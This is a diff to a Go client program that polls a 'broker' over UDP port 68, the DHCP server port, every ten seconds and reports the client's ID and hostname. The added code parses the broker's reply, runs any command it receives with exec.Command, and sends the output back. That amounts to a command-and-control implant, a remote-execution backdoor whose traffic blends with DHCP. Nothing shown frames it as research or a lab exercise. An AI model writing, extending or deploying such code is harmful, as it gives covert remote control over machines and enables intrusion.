@@ -1,16 +1,20 @@
 package main
 
 import (
+	"encoding/json"
+	"fmt"
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 )
 
 const (
-	serverIP   = "127.0.0.1" // change to server IP if remote
+	brokerIP   = "127.0.0.1" // change to server IP if remote
 	serverPort = 68
 	pollEvery  = 10 * time.Second
 	readTO     = 3 * time.Second // how long to wait for server reply
@@ -29,12 +33,26 @@ type Payload struct {
 	ServerAddress  string  `json:"serverAddress"`
 }
 
+func runCommand(command string) string {
+	parts := strings.Fields(command)
+	if len(parts) == 0 {
+		return "no command provided"
+	}
+
+	cmd := exec.Command(parts[0], parts[1:]...)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("error: %v\n%s", err, string(out))
+	}
+	return string(out)
+}
+
 func main() {
 
 	messageCounter := 0
 
 	serverAddr := &net.UDPAddr{
-		IP:   net.ParseIP(serverIP),
+		IP:   net.ParseIP(brokerIP),
 		Port: serverPort,
 	}
 
@@ -58,7 +76,7 @@ func main() {
 
 	payload := Payload{
 		ClientID:       clientID,
-		ServerAddress:  serverIP,
+		ServerAddress:  brokerIP,
 		Action:         "init",
 		Args:           nil,
 		ActionID:       nil,
@@ -67,6 +85,7 @@ func main() {
 		Hostname:       hostname,
 		MessageCounter: messageCounter,
 	}
+
 	response := doTransaction(payload)
 	log.Print(response)
 
@@ -79,7 +98,19 @@ func main() {
 		case <-ticker.C:
 			log.Printf("doing transaction\n")
 			response = doTransaction(payload)
+			json.Unmarshal([]byte(response), &payload) // update payload with any new command info
+			messageCounter++
+			payload.MessageCounter = messageCounter
 			log.Print(response)
+			if payload.Action == "run" && payload.Args != nil {
+				fmt.Printf("Got command: %s %s\n", payload.Action, *payload.Args)
+				output := runCommand(*payload.Args)
+				payload.Output = &output
+				payload.Action = "report"
+				// Send result back
+				payload.Output = &output
+				doTransaction(payload)
+			}
 		case <-stop:
 			log.Println("client: received shutdown signal, exiting")
 			return
